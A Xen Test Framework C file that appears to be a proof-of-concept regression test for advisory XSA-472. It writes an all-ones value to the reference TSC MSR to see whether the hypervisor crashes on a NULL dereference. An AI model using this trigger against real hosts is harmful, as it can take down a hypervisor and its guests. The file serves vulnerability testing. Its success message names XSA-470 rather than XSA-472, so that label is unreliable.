/**
 * @file tests/xsa-472-1/main.c
 * @ref test-xsa-472-1
 *
 * @page test-xsa-472-1 XSA-472 TSC reference NULL deref
 *
 * Advisory: [XSA-472](https://xenbits.xen.org/xsa/advisory-472.html)
 *
 * Check whether reference TSC updating logic checks whether the mapping of the
 * reference TSC page is valid, otherwise it triggers a NULL pointer deref
 * inside the hypervisor.
 *
 * @see tests/xsa-472-1/main.c
 */
#include <xtf.h>

const char test_title[] = "XSA-472-1 PoC";

#define HV_X64_MSR_REFERENCE_TSC 0x40000021

void test_main(void)
{
    /* Test if HV_X64_MSR_REFERENCE_TSC checks for valid mapping. */
    wrmsr(HV_X64_MSR_REFERENCE_TSC, ~0UL);

    /*
     * If we're still alive here, Xen didn't crash, so the NULL pointer
     * dereference is not present.
     */
    xtf_success("Success: Not vulnerable to XSA-470 (CVE-2025-27466)\n");
}

/*
 * Local variables:
 * mode: C
 * c-file-style: "BSD"
 * c-basic-offset: 4
 * tab-width: 4
 * indent-tabs-mode: nil
 * End:
 */
